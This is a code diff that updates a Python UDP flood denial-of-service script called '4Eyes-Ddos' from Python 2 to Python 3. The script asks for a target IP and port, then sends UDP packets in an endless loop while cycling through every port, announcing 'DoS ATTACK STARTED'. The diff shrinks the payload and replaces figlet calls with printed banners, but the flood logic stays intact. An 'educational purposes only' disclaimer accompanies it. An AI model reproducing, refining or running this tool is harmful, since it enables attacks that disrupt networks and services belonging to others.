@@ -1,46 +1,43 @@
-print ("\033[92m")
-import sys
+print("\033[92m")
 import os
 import time
 import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+test_data = os.urandom(16)
 
 os.system("clear")
-os.system("figlet 4Eyes-Ddos")
-print
-print "Coded By : 4eyes"
-print "Author   : 4eyes"
-print "Github   : github.com/4eyes"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+print(r""" _  _   _____                      ____      _           
+| || | | ____|   _  ___  ___      |  _ \  __| | ___  ___ 
+| || |_|  _|| | | |/ _ \/ __|_____| | | |/ _` |/ _ \/ __|
+|__   _| |__| |_| |  __/\__ \_____| |_| | (_| | (_) \__ \
+   |_| |_____\__, |\___||___/     |____/ \__,_|\___/|___/
+             |___/                                       
+""")
+print("Coded By : 4eyes")
+print("Author   : 4eyes")
+print("Github   : github.com/4eyes")
+print("Note: This tool is illegal to misuse and is for educational purposes only. Use it at your own risk. We aren't responsible for your actions.")
+print()
+ip = input("IP Target : ")
+port = int(input("Port: "))
 os.system("clear")
-os.system("figlet 4e-Ddos")
+print(r""" _  _              ____      _           
+| || |   ___      |  _ \  __| | ___  ___ 
+| || |_ / _ \_____| | | |/ _` |/ _ \/ __|
+|__   _|  __/_____| |_| | (_| | (_) \__ \
+   |_|  \___|     |____/ \__,_|\___/|___/
+""")
 print("Team : 4eyes")
 print ("\033[92m")
-print "__________________________4_Eyes_______________________________"  
-time.sleep(3)
-print "    DoS ATTACK STARTED."
-time.sleep(3)
+print("__________________________4_Eyes_______________________________")
+print("DoS ATTACK STARTED.")
+time.sleep(1)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(test_data, (ip, port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print(f"Sent {sent} packet to {ip} through port: {port}")
      if port == 65534:
        port = 1
